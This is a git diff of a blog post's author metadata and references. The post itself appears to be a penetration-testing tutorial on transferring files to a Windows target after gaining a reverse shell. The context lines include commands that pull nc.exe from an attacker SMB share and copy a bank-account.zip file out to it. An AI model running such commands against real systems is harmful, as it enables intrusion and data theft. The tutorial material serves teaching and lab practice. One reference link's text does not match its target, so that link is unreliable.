@@ -9,8 +9,13 @@ layout: single
 classes:
   - landing
 author:
-  name   : "Awakened"
-  avatar : "/assets/avatar.jpg"
+  name             : "Awakened"
+  avatar           : "/assets/avatar.jpg"
+  bio              : "An information security enthusiast who is particularly interested in hacking and securing mobile applications"
+  location         : "Singapore"
+  email            : awakened.1712@gmail.com
+  facebook         : h0ngnh4t.ph4m
+  stackoverflow    : 950983/krypton
 ---
 
 Tranfer files to the target machine is particularly useful when we have already had a reverse shell on Windows. Windows does not have convenient commands to download files such as wget in Linux.
@@ -80,6 +85,5 @@ copy \\10.11.0.105\ROPNOP\nc.exe .
 copy C:\bank-account.zip \\10.11.0.105\ROPNOP\
 ```
 **References**
-
 [https://blog.ropnop.com/transferring-files-from-kali-to-windows/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
 [http://ostrokonskiy.tk/2017/01/23/windows-privilege-escalation/](https://blog.ropnop.com/transferring-files-from-kali-to-windows/)
